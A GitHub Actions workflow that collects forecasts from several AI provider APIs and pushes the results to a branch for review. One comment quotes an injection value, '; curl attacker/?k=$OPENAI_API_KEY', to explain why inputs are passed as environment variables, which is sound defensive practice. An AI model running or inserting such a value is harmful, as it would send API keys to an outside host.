name: Elicit end-state forecasts

on:
  schedule:
    # 14:00 UTC on the 1st of every month. Gated on the ELICITATION_ENABLED
    # repository variable so scheduled runs stay off until keys are configured.
    - cron: '0 14 1 * *'
  workflow_dispatch:
    inputs:
      models:
        description: 'Comma-separated model keys from tools/models.json (default: all)'
        required: false
      samples:
        description: 'Samples per model'
        required: false
        default: '20'
      check_only:
        description: 'Preflight only — verify keys and model ids, elicit nothing'
        type: boolean
        required: false
        default: false
      list_models:
        description: 'List the models each provider serves, then stop'
        type: boolean
        required: false
        default: false

permissions:
  contents: write
  pull-requests: write

jobs:
  elicit:
    if: github.event_name == 'workflow_dispatch' || vars.ELICITATION_ENABLED == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 22

      - name: List available models
        if: inputs.list_models
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
          XAI_API_KEY: ${{ secrets.XAI_API_KEY }}
          META_API_KEY: ${{ secrets.META_API_KEY }}
          DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
          MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
          MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY }}
        run: node tools/run-elicitation.mjs --list

      - name: Preflight — verify keys and model ids
        if: inputs.check_only
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
          XAI_API_KEY: ${{ secrets.XAI_API_KEY }}
          META_API_KEY: ${{ secrets.META_API_KEY }}
          DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
          MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
          MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY }}
        run: node tools/run-elicitation.mjs --check

      # Dispatch inputs reach the shell as environment variables rather than
      # expression interpolation: this step holds every provider API key, so a
      # value like "; curl attacker/?k=$OPENAI_API_KEY" must never be able to
      # become a command. The harness validates the values themselves.
      - name: Elicit forecasts
        if: ${{ !inputs.check_only && !inputs.list_models }}
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
          XAI_API_KEY: ${{ secrets.XAI_API_KEY }}
          META_API_KEY: ${{ secrets.META_API_KEY }}
          DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
          MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
          MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY }}
          SAMPLES: ${{ inputs.samples || '20' }}
          MODELS: ${{ inputs.models }}
        run: |
          set -euo pipefail
          argv=(--samples "$SAMPLES")
          if [ -n "${MODELS:-}" ]; then argv+=(--models "$MODELS"); fi
          node tools/run-elicitation.mjs "${argv[@]}"

      # Elicitation costs real money, so persist the raw batches before any
      # later step can fail. The artifact is the recovery path if the push below
      # is blocked by repo permissions.
      - name: Upload raw batches
        if: ${{ !inputs.check_only && !inputs.list_models }}
        uses: actions/upload-artifact@v4
        with:
          name: runs-${{ github.run_id }}
          path: runs/
          retention-days: 30

      - name: Import into site data
        if: ${{ !inputs.check_only && !inputs.list_models }}
        run: node tools/import-runs.mjs

      # Syntax alone was checked before, and only on the generated file — a
      # run could publish a valid-JS allocation that did not sum to 100, or an
      # app.js that never parsed.
      - name: Check the site
        if: ${{ !inputs.check_only && !inputs.list_models }}
        run: |
          set -euo pipefail
          node --check public/data.js
          node --check public/app.js
          node tools/check-site.mjs

      # Push a branch rather than using a create-PR action: pushing needs only
      # contents:write (granted above), while opening a PR from Actions needs
      # the repo-level "Allow GitHub Actions to create and approve pull
      # requests" setting. Open the PR from the branch when reviewing.
      - name: Push elicitation branch
        if: ${{ !inputs.check_only && !inputs.list_models }}
        run: |
          set -euo pipefail
          BRANCH="elicitation/${{ github.run_id }}"
          git config user.name  "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git checkout -b "$BRANCH"
          git add runs public/data.js
          if git diff --cached --quiet; then
            echo "No changes to commit."; exit 0
          fi
          git commit -m "Add automated end-state elicitation run"
          git push origin "$BRANCH"
          echo "Pushed $BRANCH — open a PR from it to publish." >> "$GITHUB_STEP_SUMMARY"
